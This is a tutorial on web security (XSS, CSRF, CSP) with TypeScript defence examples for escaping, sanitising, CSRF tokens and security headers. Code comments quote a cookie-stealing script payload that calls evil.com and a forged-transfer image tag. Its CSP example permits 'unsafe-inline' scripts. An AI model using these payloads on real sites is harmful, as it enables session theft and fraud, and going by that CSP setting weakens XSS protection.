# Web Security (XSS, CSRF, CSP) 🛡️

## 1. The "Bank Security" Analogy

Your web app is like a bank:
- **XSS:** Someone passes a fake note (script) through a teller, and it gets processed as real.
- **CSRF:** Someone tricks a customer into signing a withdrawal slip for the wrong account.
- **CSP:** The bank's policy on who is allowed inside the building.

**Web Security.** Protecting your application from malicious attacks.

---

## 2. The Core Concept

**XSS (Cross-Site Scripting):**
Attacker injects malicious scripts that run in users' browsers.

**CSRF (Cross-Site Request Forgery):**
Attacker tricks users into performing unwanted actions.

**CSP (Content Security Policy):**
Browser policy that controls what resources can load.

---

## 3. Interactive Visualization 🎮

```visualizer
{
  "type": "none",
  "data": [],
  "message": "Security visualizer coming soon!"
}
```

---

## 4. Scenario A: XSS Prevention

### TypeScript Implementation

```typescript
/**
 * XSS Attack Example:
 * User submits: <script>fetch('evil.com?cookie='+document.cookie)</script>
 * If rendered directly, steals cookies!
 */

// ❌ VULNERABLE: Direct HTML insertion
element.innerHTML = userInput; // NEVER DO THIS

// ✓ SAFE: Use textContent for plain text
element.textContent = userInput;

// ✓ SAFE: Sanitize HTML if needed
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// ✓ SAFE: Escape special characters
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// ✓ SAFE: React auto-escapes by default
// dangerouslySetInnerHTML requires explicit opt-in
function SafeComponent({ userInput }: { userInput: string }) {
  return <div>{userInput}</div>; // Auto-escaped
}
```

---

## 5. Scenario B: CSRF Protection

### TypeScript Implementation

```typescript
/**
 * CSRF Attack Example:
 * Attacker's site has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
 * If user is logged into bank, transfer happens!
 */

// ✓ CSRF Token Pattern
import crypto from 'crypto';

// Generate token on session creation
function generateCSRFToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// Include token in forms
const csrfToken = generateCSRFToken();
// <input type="hidden" name="_csrf" value="${csrfToken}">

// Validate on form submission
function validateCSRFToken(req: Request, res: Response, next: NextFunction) {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  next();
}

// ✓ SameSite Cookies (modern browsers)
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Prevents CSRF
});
```

---

## 6. Real World Applications 🌍

### Security Headers

```typescript
// Express middleware for security headers
import helmet from 'helmet';

app.use(helmet());

// Content Security Policy
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  },
}));

// Other important headers
app.use(helmet.hsts()); // HTTPS only
app.use(helmet.noSniff()); // Prevent MIME sniffing
app.use(helmet.frameguard()); // Clickjacking protection
```

---

## 7. Complexity Analysis 🧠

### Security Checklist

| Attack | Prevention |
|--------|------------|
| **XSS** | Escape output, CSP, HttpOnly cookies |
| **CSRF** | Tokens, SameSite cookies |
| **Injection** | Parameterized queries |
| **Clickjacking** | X-Frame-Options |

### Interview Tips 💡

1. **Know the OWASP Top 10:** Most common vulnerabilities.
2. **Defense in depth:** Multiple layers of protection.
3. **Secure defaults:** Libraries like React escape by default.
4. **Regular audits:** Dependency scanning, penetration testing.
